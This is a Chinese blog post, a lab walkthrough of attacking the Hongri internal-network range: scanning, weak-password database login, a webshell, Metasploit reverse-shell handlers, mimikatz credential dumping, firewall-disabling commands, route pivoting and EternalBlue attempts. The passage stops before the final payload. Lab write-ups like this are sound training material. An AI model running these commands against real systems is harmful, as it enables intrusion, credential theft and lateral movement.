@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>【内网安全】红日安全靶场（上） | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><meta name="description" content="曾经 你说看星星看日落不如看我的眼眸……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【内网安全】红日安全靶场（上）">
+<meta property="og:url" content="https://m0re.top/posts/564d8432/index.html">
+<meta property="og:site_name" content="m0re的小站">
+<meta property="og:description" content="曾经 你说看星星看日落不如看我的眼眸……">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211123154003.jpeg">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120202649.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120203312.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120204349.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120204555.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120204819.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120205738.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120205948.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120210044.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120210424.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120210634.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120211303.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120211511.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120212315.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120212350.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120213534.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120214831.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211120215751.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121111346.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121111645.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121112600.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121113951.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121114038.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121121633.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121122153.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211122203547.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211122203920.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121124820.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211121125423.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211122210412.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211122210649.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211122213952.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211123112330.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211123133538.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20211123152731.png">
+<meta property="article:published_time" content="2021-11-23T07:41:27.052Z">
+<meta property="article:modified_time" content="2021-11-23T07:40:53.423Z">
+<meta property="article:author" content="m0re">
+<meta property="article:tag" content="内网安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/20211123154003.jpeg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0re的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">119</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">20</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">51</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网与域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="toc-number">4.2.</span> <span class="toc-text">主机密码收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text">继续信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91"><span class="toc-number">4.4.</span> <span class="toc-text">内网流量转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms08-067%E8%8E%B7%E5%BE%97shell"><span class="toc-number">4.5.</span> <span class="toc-text">ms08-067获得shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms07-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dgetshell"><span class="toc-number">4.6.</span> <span class="toc-text">ms07-010永恒之蓝getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8F%A3%E4%BB%A4%E7%8C%9C%E6%B5%8B"><span class="toc-number">4.7.</span> <span class="toc-text">SMB远程桌面口令猜测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93TNS%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.8.</span> <span class="toc-text">Oracle数据库TNS服务漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%E2%80%A6"><span class="toc-number">5.</span> <span class="toc-text">未完待续….</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/564d8432/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">【内网安全】红日安全靶场（上）</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-11-23 15:41:27" itemprop="dateCreated datePublished" datetime="2021-11-23T15:41:27+08:00">2021-11-23</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/564d8432/" data-flag-title="【内网安全】红日安全靶场（上）"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">内网安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">内网安全</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123154003.jpeg" loading="lazy"><br>曾经 你说看星星看日落不如看我的眼眸……</p>
+<a id="more"></a>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>直接选择虚拟机打开即可，默认密码均为<code>hongrisec@2019</code>，开机后会提示改密码，修改一下。然后进入，会提示重启更新配置。重启一下。然后给三台虚拟机单独分配一个网络适配器(<code>VMnet2</code>)，其中win7需要增加一个网络适配器2。如图</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120202649.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">win7:内网IP：192.168.52.143	外网IP：192.168.88.137		<span class="token punctuation">(</span>记得将phpstudy服务运行起来<span class="token punctuation">)</span>
+Kali<span class="token punctuation">(</span>攻击IP<span class="token punctuation">)</span>：192.168.88.128			   
+windows 2k3：192.168.52.141			     域内成员机
+Windows server <span class="token number">2008</span>：192.168.52.138		 域控服务器</code></pre>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内网收集信息，先扫描存活主机。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">netdiscover -i eth0 -r <span class="token number">192.168</span>.1/0/24</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120203312.png" loading="lazy"></p>
+<p>根据扫描结果发现域内主机有三个，<code>192.168.52.143/138/141</code>，这三台主机是无法访问的，其中还有一台<code>192.168.88.137</code>可以访问的，也就是与攻击机Kali在同一个IP段内。</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用<code>Nmap</code>来进行扫描</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -sC -v -n -sV -Pn -p <span class="token number">1</span>-65535 <span class="token number">192.168</span>.88.137</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120204349.png" loading="lazy"></p>
+<p>看信息，开放端口：<code>80&amp;3306</code>，且web服务是<code>PHPstudy</code></p>
+<p>访问查看，发现是<code>phpstudy</code>的探针,收集敏感信息</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120204555.png" alt="image-20211120204553009" loading="lazy"></p>
+<p>可以看出，网站目录<code>C:/phpStudy/WWW/</code>，探针地址等还有禁用函数。最后还有个连接MySQL数据库的操作，尝试弱口令，<code>root:root&amp;&amp;root:123456</code>发现用户密码均为<code>root</code>，连接成功</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120204819.png" alt="image-20211120204817929" loading="lazy"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用<code>dirsearch</code>来进行扫描</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120205738.png" alt="image-20211120205736361" loading="lazy"></p>
+<p>扫描没发现beifen.rar，由于现在这么写备份网站的已经很少了，所以常用字典中就给去掉了。实际上是有网站源码备份的。不过这里还扫出来了<code>phpmyadmin</code>网站</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120205948.png" alt="image-20211120205946070" loading="lazy"></p>
+<p>不知道是否可以登录。然后发现是可以登录的</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120210044.png" alt="image-20211120210042695" loading="lazy"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li>信息泄露</li>
+</ol>
+<p>前台的公告，提示建站者修改密码，但是粗心的建站者不改，那么就可以使用这个默认用户名和密码来进行登录后台了。</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120210424.png" alt="image-20211120210422501" loading="lazy"></p>
+<p>尝试登录后台</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120210634.png" alt="image-20211120210632960" loading="lazy"></p>
+<p><code>CMS</code>漏洞不再复现，现在直接<code>getshell</code>，并向内网延伸。</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120211303.png" alt="image-20211120211301270" loading="lazy"></p>
+<p>直接创建一句话木马。路径问题省略，自行寻找，直接连接<code>getshell</code></p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120211511.png" alt="image-20211120211510171" loading="lazy"></p>
+<p>这里将CS的客户端还有服务端均部署在kali中</p>
+<p>创建监听并生成powershell command，在蚁剑中执行。</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120212315.png" alt="image-20211120212313909" loading="lazy"></p>
+<p>然后在客户端，肉鸡将上线CS。</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120212350.png" alt="image-20211120212349096" loading="lazy"></p>
+<h2 id="内网与域渗透"><a href="#内网与域渗透" class="headerlink" title="内网与域渗透"></a>内网与域渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>使用<code>shell ipconfig</code>可以看到内网IP为<code>192.168.52.143</code></p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120213534.png" alt="image-20211120213533008" loading="lazy"></p>
+<p>这里还是回到蚁剑操作比较方便</p>
+<p>以及域(<code>god.org</code>)</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120214831.png" loading="lazy"></p>
+<p>其实使用不止CS这一种C2工具，其中<code>metasploit</code>也是一个极佳的选择</p>
+<pre class="language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler &#x2F;&#x2F;&#x2F;使用exploit&#x2F;multi&#x2F;handler进行探测
+
+set payload Windows&#x2F;meterpreter&#x2F;reverse_tcp &#x2F;&#x2F;&#x2F; 设置payload &#39;Windows&#x2F;meterpreter&#x2F;reverse_tcp&#39; 进行监听
+
+set LHOST 192.168.88.128 &#x2F;&#x2F;&#x2F;设置下主机地址
+
+run&#x2F;exploit &#x2F;&#x2F;&#x2F;开始攻击</code></pre>
+
+<p>下面是一些常见的域内信息收集使用的命令。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net group /domain  <span class="token comment">#查看域内所有用户列表</span>
+net group <span class="token string">"domain computers"</span> /domain <span class="token comment">#查看域成员计算机列表</span>
+net group <span class="token string">"domain admins"</span> /domain <span class="token comment">#查看域管理员用户</span>
+<span class="token function">whoami</span> ///收集目标机器的身份
+<span class="token function">hostname</span> /// 显示主机名称
+net user ///显示用户
+net localgroup administrator ///显示本地管理员组</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120215751.png" alt="image-20211120215745358" loading="lazy"></p>
+<h3 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h3><p>使用<code>hashdump</code>或者<code>mimikatz</code>来进行密码读取。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">右键——<span class="token operator">></span>Access——<span class="token operator">></span>DumpHashes
+右键——<span class="token operator">></span>Access——<span class="token operator">></span>Run Mimikatz</code></pre>
+
+<p>自动执行命令</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121111346.png" loading="lazy"></p>
+<p>然后在Credentials（凭证栏）查看获取的密码</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121111645.png" alt="image-20211121111643980" loading="lazy"></p>
+<h3 id="继续信息收集"><a href="#继续信息收集" class="headerlink" title="继续信息收集"></a>继续信息收集</h3><p>这里先进行一下CS与MSF联动，从CS中将会话(session)传给msf</p>
+<p>首先在msf中启动并监听自己的IP和端口</p>
+<pre class="language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;meterpreter&#x2F;reverse_http（跟cs上选用的payload一样）
+set lhost 本机ip
+set lport 接受的端口
+exploit 执行</code></pre>
+
+<p>正在运行ing…..</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121112600.png" alt="image-20211121112559074" loading="lazy"></p>
+<p>在CS那边，创建一个foreign监听的listener</p>
+<blockquote>
+<p>注意在MSF中选用的payload要与CS中相同，否则就会出现会话不合格的报错。上图中没修改，但是上面payload已经修改过了</p>
+</blockquote>
+<p>然后右键选择一个会话，进行转发，右键——&gt;spawn，选择foreign那个会话</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121113951.png" alt="image-20211121113949365" loading="lazy"></p>
+<p>然后回到msf，已经拿到了session了</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121114038.png" alt="image-20211121114037200" loading="lazy"></p>
+<p>小插曲过去，然后再回到信息收集中</p>
+<ol>
+<li>查看补丁信息</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_patches</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121121633.png" alt="image-20211121121632501" loading="lazy"></p>
+<p>有点不理解，一直报错，原以为是进程的问题，尝试了换exe反弹shell，还有<code>php/meterperter/reverse_tcp</code>等方法，都是这样的结果。有点不理解。</p>
+<ol start="2">
+<li>这一步跳过了，下一步，看看安装了哪些软件</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_applications</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121122153.png" alt="image-20211121122151939" loading="lazy"></p>
+<p>看到有安装nmap，然后使用win7这台肉鸡对内网进行扫描。</p>
+<ol start="3">
+<li>查看路由信息，并添加路由到目标环境，使得msf可以通过win7来转发访问192.168.52.0的网段。</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">run get_local_subnets	<span class="token comment"># 查看路由</span>
+run autoroute -s <span class="token number">192.168</span>.52.0/24	<span class="token comment"># 添加路由</span></code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122203547.png" alt="image-20211122203545872" loading="lazy"></p>
+<ol start="4">
+<li>使用arp扫描52这个网段</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/arp_scanner <span class="token assign-left variable">RHOSTS</span><span class="token operator">=</span><span class="token number">192.168</span>.52.0/24
+run auxiliary/scanner/portscan/tcp <span class="token assign-left variable">RHOSTS</span><span class="token operator">=</span><span class="token number">192.168</span>.52.141 <span class="token assign-left variable">PORTS</span><span class="token operator">=</span><span class="token number">3389</span></code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122203920.png" alt="image-20211122203919146" loading="lazy"></p>
+<ol start="4">
+<li>使用win7的nmap对域内主机进行扫描</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">shell nmap --script<span class="token operator">=</span>vuln <span class="token number">192.168</span>.52.141</code></pre>
+
+
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121124820.png" alt="image-20211121124819225" loading="lazy"></p>
+<p>然后看下在win2008扫描的的漏洞信息</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121125423.png" alt="image-20211121125421823" loading="lazy"></p>
+<p>发现<code>192.168.52.141</code>存在漏洞：<code>MS08-067</code>、<code>MS17-010</code>，<code>192.168.52.138</code>存在<code>MS17-010</code>漏洞。</p>
+<h3 id="内网流量转发"><a href="#内网流量转发" class="headerlink" title="内网流量转发"></a>内网流量转发</h3><p><code>msf</code>成功反弹<code>shell</code>，并添加路由到目标环境网络。使得<code>msf</code>能够通过<code>win7</code>的路由转发访问<code>192.168.52.0/24</code>网段.</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122210412.png" alt="image-20211122210410967" loading="lazy"></p>
+<p>然后使用<code>socks_proxy</code>代理模块进行配置。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">use auxiliary/server/socks_proxy</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122210649.png" alt="image-20211122210647415" loading="lazy"></p>
+<p>然后使用文本编辑器修改<code>/etc/proxychains4.conf</code>文件，最后一行添加配置</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>ProxyList<span class="token punctuation">]</span>
+
+socks4 <span class="token number">192.168</span>.88.128 <span class="token number">1080</span></code></pre>
+
+<p>测试下，使用nmap扫描内网靶机</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains nmap -sT -sV -Pn -p22,80,443,445,135 --script<span class="token operator">=</span>vuln  <span class="token number">192.168</span>.52.141</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122213952.png" alt="image-20211122213917330" loading="lazy"></p>
+<p>关于这个代理设置踩坑的，回头单独写一篇。这里不细说这个。</p>
+<h3 id="ms08-067获得shell"><a href="#ms08-067获得shell" class="headerlink" title="ms08-067获得shell"></a>ms08-067获得shell</h3><p>首先需要进行关闭防火墙（<code>win7+win2008+2003</code>）</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">netsh firewall <span class="token builtin class-name">set</span> opmode disable   <span class="token comment"># windows server 2003 之前</span>
+netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off  <span class="token comment"># windows server 2003 之后</span></code></pre>
+
+<p>然后尝试攻击</p>
+<p>这个看了很多师傅的复现过程，很多人这里都打不通。原因未知，可能是环境出问题了</p>
+<h3 id="ms07-010永恒之蓝getshell"><a href="#ms07-010永恒之蓝getshell" class="headerlink" title="ms07-010永恒之蓝getshell"></a>ms07-010永恒之蓝getshell</h3><p>在扫描过程中，发现的win2k3和2008都有445端口开放，都存在永恒之蓝漏洞，但是利用过程中，2003这台域内主机利用失败。</p>
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123112330.png" alt="image-20211123112329180" loading="lazy"></p>
+<p>现在只能想到的原因是我的meterpreter是从CS中传递过来的，方式是http，但是在msf中我使用了tcp的payload进行攻击，现在考虑整个过程只能想到是这个原因了。然后我换了一种方式，对2008进行攻击</p>
+<p>使用的模块以及payload如下</p>
